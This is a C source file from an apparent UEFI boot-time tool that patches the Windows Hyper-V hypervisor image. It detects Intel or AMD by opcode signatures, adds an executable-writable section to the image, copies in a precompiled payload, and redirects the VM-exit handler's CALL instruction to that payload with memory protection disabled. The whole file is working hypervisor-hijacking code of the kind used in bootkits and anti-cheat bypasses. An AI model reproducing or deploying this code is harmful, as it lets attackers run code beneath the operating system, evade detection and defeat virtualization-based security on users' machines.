#include "ExtendedHv.h"
#include "Compiler.h"
#include "WinDefines.h"
#include "../Payload/payload_intel_data.h"
#include "../Payload/payload_amd_data.h"

#define ARCH_UNKNOWN 0
#define ARCH_INTEL 1
#define ARCH_AMD 2

// Imports
extern VOID EFIAPI SerialPrint(IN CONST CHAR8 *format, ...);
extern VOID EFIAPI SerialPrintHex(IN CONST CHAR8 *label, IN UINT64 value);
extern UINT64 PeAddSection(IN UINT64 imageBase, IN CONST CHAR8* sectionName, IN UINT32 virtualSize, IN UINT32 characteristics);
extern UINT64 FindPatternImage(IN VOID* imageBase, IN CONST CHAR8* pattern);
extern UINT64 FindPattern(IN VOID* base, IN UINTN size, IN CONST CHAR8* pattern);

// Public Functions
EFI_STATUS InstallPatch_VmExitHandler(UINT64 imageBase, UINT64 imageSize);
UINT64 PatchSizeVmExitHandler(VOID);

// Private Functions
static int DetectArchitecture(IN VOID* imageBase);
static EFI_STATUS PatchIntel(IN UINT64 imageBase, IN UINT64 section);
static EFI_STATUS PatchAmd(IN UINT64 imageBase, IN UINT64 section);
static EFI_STATUS PatchCall(IN UINT64 imageBase, IN UINT64 section, IN CONST CHAR8 *pattern, IN UINT32 callOffset, IN INT64 *payloadGlobal, UINT64 payloadFunctionOffset);

// Implementation
UINT64 PatchSizeVmExitHandler(VOID) {
  return INTEL_PAYLOAD_SIZE < AMD_PAYLOAD_SIZE ? AMD_PAYLOAD_SIZE : INTEL_PAYLOAD_SIZE;
}

EFI_STATUS InstallPatch_VmExitHandler(UINT64 imageBase, UINT64 imageSize) {
  UINT64 section;
  int arch;
  EFI_STATUS status;

  //
  // Detect architecture
  // 
  arch = DetectArchitecture((VOID*)imageBase);
  if (arch == ARCH_INTEL) {
    SerialPrint("[+] Intel Architecture Detected.\n");
  } else if (arch == ARCH_AMD) {
    SerialPrint("[+] AMD Architecture Detected.\n");
  } else {
    SerialPrint("[!] Failed to detect Architecture.\n");
    return EFI_UNSUPPORTED;
  }

  //
  // Add payload section
  // 
  section = PeAddSection(imageBase, ".zczxyhc", PatchSizeVmExitHandler(), SECTION_RWX);
  if (!section) {
    SerialPrint("[!] Failed to add payload section\n");
    return EFI_UNSUPPORTED;
  }

  //
  // Apply architecture specific patch
  //
  if (arch == ARCH_INTEL) {
    status = PatchIntel(imageBase, section);
    if (EFI_ERROR(status)) SerialPrint("[!] Failed to patch hvix64.exe\n");
  } else {
    status = PatchAmd(imageBase, section);
    if (EFI_ERROR(status)) SerialPrint("[!] Failed to patch hvax64.exe\n");
  }
  SerialPrint("[+] Patch hv*x64.exe successfully.\n");

  return EFI_SUCCESS;
}

static int DetectArchitecture(IN VOID* imageBase) {
  //
  // Intel: Look for VMRESUME
  // 
  if (FindPatternImage(imageBase, "0F 01 C3") != 0) {
    return ARCH_INTEL;
  }

  //
  // AMD: Look for VMRUN
  // 
  if (FindPatternImage(imageBase, "0F 01 D8") != 0) {
    return ARCH_AMD;
  }

  return ARCH_UNKNOWN;
}

static EFI_STATUS PatchIntel(IN UINT64 imageBase, IN UINT64 section) {
  //
  // This seems to change every window version, intel will most likely
  // require a more robust solution. I have disssassembled this myself and
  // will write up the method in the blog I make about this afterwards.
  // (The blog is to ensure I won't forget this when I need to come back
  // and do it again, intel really is a company of all time. I would like
  // to make it clear Intel is not difficult due to good security, its because
  // even with the documentation, no one knows what was going through
  // the developers mind when designing this system.)
  //

  if (EFI_ERROR(PatchCall(imageBase, section, "E8 ? ? ? ? E9 ? ? ? ? 74", 0, INTEL_PAYLOAD_GLOBAL_PTR(g_intel_payload_data), INTEL_PAYLOAD_FUNCTION_OFFSET))) {
    SerialPrint("[!] Failed to patch Call for Intel, not copying!\n");
    return EFI_UNSUPPORTED;
  }
  SerialPrint("[+] Copying updated payload.\n");

  //
  // Copy the patched payload into the section
  // Note: g_intel_payload_data has already been patched by PatchCall
  // 
  DisableMemoryProtection();
  CopyMem((VOID*)section, g_intel_payload_data, INTEL_PAYLOAD_SIZE);
  FlushInstructionCache((VOID*)section, INTEL_PAYLOAD_SIZE);
  EnableMemoryProtection();

  return EFI_SUCCESS;  
}

static EFI_STATUS PatchAmd(IN UINT64 imageBase, IN UINT64 section) {
  //
  // Find pattern for the relative call that has not changed since the release of voyager
  // https://github.com/backengineering/Voyager/blob/master/Voyager/Voyager/Hv.h
  //
  if (EFI_ERROR(PatchCall(imageBase, section, "E8 ? ? ? ? 48 89 04 24 E9", 0, AMD_PAYLOAD_GLOBAL_PTR(g_amd_payload_data), AMD_PAYLOAD_FUNCTION_OFFSET))) {
    SerialPrint("[!] Failed to patch Call for AMD, not copying!\n");
    return EFI_UNSUPPORTED;
  }
  SerialPrint("[+] Copying updated payload.\n");

  //
  // Copy the patched payload into the section
  // Note: g_amd_payload_data has already been patched by PatchCall
  // 
  DisableMemoryProtection();
  CopyMem((VOID*)section, g_amd_payload_data, AMD_PAYLOAD_SIZE);
  FlushInstructionCache((VOID*)section, AMD_PAYLOAD_SIZE);
  EnableMemoryProtection();

  return EFI_SUCCESS;
}

static EFI_STATUS PatchCall(IN UINT64 imageBase, IN UINT64 section, IN CONST CHAR8 *pattern, IN UINT32 callOffset, IN INT64 *payloadGlobal, UINT64 payloadFunctionOffset) {
  UINT64 patternAddr;
  UINT64 callAddr;
  UINT64 callBase;
  INT32 originalOffset;
  UINT64 originalFunction;
  UINT64 hookedFunction;
  INT32 newOffset;
  INT64 offsetToOriginal;

  patternAddr = FindPatternImage((VOID*)imageBase, pattern);
  if (!patternAddr) {
    SerialPrint("[!] Pattern not found.\n");
    return EFI_UNSUPPORTED;
  }
  SerialPrint("[+] Found pattern at 0x%p\n", patternAddr);

  // Adjust to point to the E8 byte
  callAddr = patternAddr + callOffset;
  SerialPrint("[+] CALL instruction at 0x%p\n", callAddr);

  //
  // Get the information for patching the call instruction
  // 
  callBase = callAddr + 5;
  originalOffset = *(INT32*)(callAddr + 1);
  originalFunction = callBase + originalOffset;
  hookedFunction = section + payloadFunctionOffset;
  newOffset = (INT32)(hookedFunction - callBase);
  offsetToOriginal = (INT64)(originalFunction - hookedFunction);

  SerialPrint("[+] Original offset: 0x%x\n", originalOffset);
  SerialPrint("[+] Original function: 0x%p\n", originalFunction);
  SerialPrint("[+] New offset: 0x%x\n", newOffset);

  //
  // Patch the payload data array (in our program's data section, already writable)
  //
  *payloadGlobal = offsetToOriginal;

  //
  // Patch the hypervisor's call instruction (requires memory protection disabled)
  //
  DisableMemoryProtection();
  *(INT32*)(callAddr + 1) = newOffset;
  FlushInstructionCache((VOID*)callAddr, 5);
  EnableMemoryProtection();

  SerialPrint("[+] Patched CALL instruction successfully.\n");

  return EFI_SUCCESS;
}
